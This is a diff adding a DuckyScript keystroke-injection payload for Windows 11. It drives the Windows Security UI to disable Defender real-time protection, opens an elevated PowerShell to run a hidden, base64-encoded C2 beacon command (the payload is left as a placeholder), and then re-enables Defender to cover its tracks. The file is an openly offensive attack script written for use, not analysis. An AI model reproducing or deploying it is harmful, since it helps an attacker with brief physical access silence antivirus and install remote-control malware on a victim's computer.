@@ -1,0 +1,53 @@
+REM Title: Run a c2 beacon on W11
+REM Author: 0x636f646f
+REM Description: Disable Defender\'s real time protection and initiate a beacon, then turn defender back on
+REM Target: Windows 11
+REM Version: 1.0
+REM Category: Execution
+
+    REM Description: Disable Windows Defender real time protection and deploys C2 beacon
+    DELAY 1500
+    GUI r
+    DELAY 500
+    STRING windowsdefender://threat/
+    DELAY 500
+    ENTER
+    DELAY 2000
+    TAB
+    TAB
+    TAB
+    TAB
+    ENTER
+    DELAY 1000
+    SPACE
+    DELAY 500
+    ALT y
+    DELAY 500
+    ALT F4
+
+    GUI r
+    DELAY 500
+    STRING powershell
+    CTRL-SHIFT ENTER
+    DELAY 1000
+    ALT y
+    DELAY 1000
+    STRING powershell -noP -sta -w 1 -enc <YOUR BASE64 PAYLOAD HERE>
+    ENTER
+
+    DELAY 1500
+    GUI r
+    DELAY 500
+    STRING windowsdefender://threat/
+    DELAY 500
+    ENTER
+    DELAY 2000
+    TAB
+    TAB
+    TAB
+    TAB
+    ENTER
+    DELAY 1000
+    ALT y
+    DELAY 500
+    ALT F4
